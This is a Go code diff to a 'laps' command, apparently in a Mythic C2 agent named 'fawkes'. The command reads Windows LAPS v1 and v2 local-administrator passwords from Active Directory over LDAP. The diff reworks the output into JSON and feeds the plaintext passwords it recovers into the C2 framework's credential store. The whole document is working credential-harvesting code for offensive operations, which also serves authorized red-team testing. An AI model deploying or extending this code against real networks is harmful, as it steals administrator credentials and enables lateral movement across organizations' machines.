@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"strconv"
-	"strings"
 	"time"
 
 	"fawkes/pkg/structs"
@@ -14,8 +13,10 @@ import (
 
 type LapsCommand struct{}
 
-func (c *LapsCommand) Name() string        { return "laps" }
-func (c *LapsCommand) Description() string { return "Read LAPS passwords from Active Directory (T1552.006)" }
+func (c *LapsCommand) Name() string { return "laps" }
+func (c *LapsCommand) Description() string {
+	return "Read LAPS passwords from Active Directory (T1552.006)"
+}
 
 type lapsArgs struct {
 	Server   string `json:"server"`
@@ -138,13 +139,17 @@ func (c *LapsCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	output := formatLAPSResults(result, baseDN, args.Filter)
+	output, creds := formatLAPSResults(result, baseDN, args.Filter)
 
-	return structs.CommandResult{
+	cmdResult := structs.CommandResult{
 		Output:    output,
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		cmdResult.Credentials = &creds
+	}
+	return cmdResult
 }
 
 // filetimeToTime converts a Windows FILETIME (100-ns intervals since 1601-01-01) to Go time.
@@ -167,51 +172,57 @@ func lapsExpiryStatus(expTime time.Time) string {
 	return fmt.Sprintf("expires in %dh", hours)
 }
 
-func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) string {
-	var sb strings.Builder
+// lapsOutputEntry is a single row in the JSON output for browser script rendering.
+type lapsOutputEntry struct {
+	Computer     string `json:"computer"`
+	FQDN         string `json:"fqdn,omitempty"`
+	OS           string `json:"os,omitempty"`
+	Version      string `json:"version"`
+	Account      string `json:"account,omitempty"`
+	Password     string `json:"password,omitempty"`
+	Expires      string `json:"expires,omitempty"`
+	ExpiryStatus string `json:"expiry_status,omitempty"`
+}
 
-	sb.WriteString("LAPS Password Recovery\n")
-	sb.WriteString(fmt.Sprintf("Base DN: %s\n", baseDN))
-	if filter != "" {
-		sb.WriteString(fmt.Sprintf("Filter: *%s*\n", filter))
-	}
-	sb.WriteString(fmt.Sprintf("Results: %d computers with readable LAPS passwords\n", len(result.Entries)))
-	sb.WriteString(strings.Repeat("=", 70) + "\n")
+func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) (string, []structs.MythicCredential) {
+	var creds []structs.MythicCredential
 
 	if len(result.Entries) == 0 {
-		sb.WriteString("\nNo computers found with readable LAPS passwords.\n")
-		sb.WriteString("Possible reasons:\n")
-		sb.WriteString("  - LAPS is not deployed in this domain\n")
-		sb.WriteString("  - Current account lacks Read permission on LAPS attributes\n")
-		sb.WriteString("  - No computers match the filter\n")
-		return sb.String()
+		return "[]", nil
 	}
 
-	for i, entry := range result.Entries {
+	var entries []lapsOutputEntry
+
+	for _, entry := range result.Entries {
 		name := entry.GetAttributeValue("sAMAccountName")
 		fqdn := entry.GetAttributeValue("dNSHostName")
 		osInfo := entry.GetAttributeValue("operatingSystem")
-
-		sb.WriteString(fmt.Sprintf("\n[%d] %s", i+1, name))
-		if fqdn != "" {
-			sb.WriteString(fmt.Sprintf(" (%s)", fqdn))
-		}
-		sb.WriteString("\n")
-		if osInfo != "" {
-			sb.WriteString(fmt.Sprintf("    OS:       %s\n", osInfo))
-		}
 
 		// LAPS v1
 		v1Pass := entry.GetAttributeValue("ms-Mcs-AdmPwd")
 		v1Exp := entry.GetAttributeValue("ms-Mcs-AdmPwdExpirationTime")
 		if v1Pass != "" {
-			sb.WriteString(fmt.Sprintf("    Password: %s  (LAPS v1)\n", v1Pass))
+			e := lapsOutputEntry{
+				Computer: name,
+				FQDN:     fqdn,
+				OS:       osInfo,
+				Version:  "v1",
+				Password: v1Pass,
+			}
 			if v1Exp != "" {
 				if ft, err := strconv.ParseInt(v1Exp, 10, 64); err == nil {
 					expTime := filetimeToTime(ft)
-					sb.WriteString(fmt.Sprintf("    Expires:  %s (%s)\n", expTime.Format("2006-01-02 15:04 UTC"), lapsExpiryStatus(expTime)))
+					e.Expires = expTime.Format("2006-01-02 15:04 UTC")
+					e.ExpiryStatus = lapsExpiryStatus(expTime)
 				}
 			}
+			entries = append(entries, e)
+			creds = append(creds, structs.MythicCredential{
+				CredentialType: "plaintext",
+				Account:        name,
+				Credential:     v1Pass,
+				Comment:        "laps (v1)",
+			})
 		}
 
 		// Windows LAPS v2 (plaintext JSON)
@@ -224,30 +235,59 @@ func formatLAPSResults(result *ldap.SearchResult, baseDN, filter string) string 
 				if account == "" {
 					account = v2.AccountName
 				}
-				if account != "" {
-					sb.WriteString(fmt.Sprintf("    Account:  %s  (LAPS v2)\n", account))
+				e := lapsOutputEntry{
+					Computer: name,
+					FQDN:     fqdn,
+					OS:       osInfo,
+					Version:  "v2",
+					Account:  account,
+					Password: v2.Password,
 				}
-				sb.WriteString(fmt.Sprintf("    Password: %s  (LAPS v2)\n", v2.Password))
-				if v2.Timestamp != "" {
-					sb.WriteString(fmt.Sprintf("    Updated:  %s\n", v2.Timestamp))
+				if v2Exp != "" {
+					if ft, err := strconv.ParseInt(v2Exp, 10, 64); err == nil {
+						expTime := filetimeToTime(ft)
+						e.Expires = expTime.Format("2006-01-02 15:04 UTC")
+						e.ExpiryStatus = lapsExpiryStatus(expTime)
+					}
 				}
+				entries = append(entries, e)
+				credAccount := account
+				if credAccount == "" {
+					credAccount = name
+				}
+				creds = append(creds, structs.MythicCredential{
+					CredentialType: "plaintext",
+					Account:        credAccount,
+					Credential:     v2.Password,
+					Comment:        "laps (v2)",
+				})
 			} else {
-				sb.WriteString(fmt.Sprintf("    Password: %s  (LAPS v2 raw)\n", v2Pass))
-			}
-			if v2Exp != "" {
-				if ft, err := strconv.ParseInt(v2Exp, 10, 64); err == nil {
-					expTime := filetimeToTime(ft)
-					sb.WriteString(fmt.Sprintf("    Expires:  %s (%s)\n", expTime.Format("2006-01-02 15:04 UTC"), lapsExpiryStatus(expTime)))
-				}
+				entries = append(entries, lapsOutputEntry{
+					Computer: name,
+					FQDN:     fqdn,
+					OS:       osInfo,
+					Version:  "v2-raw",
+					Password: v2Pass,
+				})
 			}
 		}
 
 		// Windows LAPS v2 (encrypted)
 		v2Enc := entry.GetRawAttributeValue("ms-LAPS-EncryptedPassword")
 		if len(v2Enc) > 0 {
-			sb.WriteString(fmt.Sprintf("    Encrypted: %d bytes (requires DPAPI backup key)\n", len(v2Enc)))
+			entries = append(entries, lapsOutputEntry{
+				Computer: name,
+				FQDN:     fqdn,
+				OS:       osInfo,
+				Version:  "v2-encrypted",
+				Password: fmt.Sprintf("%d bytes (requires DPAPI backup key)", len(v2Enc)),
+			})
 		}
 	}
 
-	return sb.String()
+	data, err := json.Marshal(entries)
+	if err != nil {
+		return fmt.Sprintf("Error marshaling output: %v", err), creds
+	}
+	return string(data), creds
 }
